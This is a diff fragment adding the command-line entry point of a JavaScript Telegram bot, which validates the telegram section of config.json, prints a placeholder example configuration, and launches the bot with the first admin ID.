+        logger.bot(`Bot launched successfully with admin ID: ${this.adminId}`);
+    }
+}
+
+// CLI entry point
+if (import.meta.url === `file://${process.argv[1]}`) {
+    const config = JSON.parse(readFileSync('./config.json', 'utf-8'));
+    
+    if (!config.telegram || !config.telegram.bot_token || !config.telegram.admin_ids || config.telegram.admin_ids.length === 0) {
+        logger.error('❌ Telegram configuration not found in config.json');
+        logger.info('💡 Please configure telegram section in config.json:');
+        logger.info(`
+{
+  "telegram": {
+    "bot_token": "YOUR_BOT_TOKEN_HERE",
+    "admin_ids": ["YOUR_TELEGRAM_USER_ID"],
+    "enabled": true
+  }
+}
+        `);
+        process.exit(1);
+    }
+
+    if (!config.telegram.enabled) {
+        logger.warning('⚠️  Telegram bot is disabled in config.json');
+        logger.info('💡 Set "telegram.enabled": true to enable');
+        process.exit(0);
+    }
+
+    const token = config.telegram.bot_token;
+    const adminId = config.telegram.admin_ids[0];
+
+    logger.info('🔧 Loading Telegram bot configuration...');
+    logger.info(`👤 Admin IDs: ${config.telegram.admin_ids.join(', ')}`);
+
+    const bot = new TelegramBot(token, adminId, config);
+    bot.launch();
+}
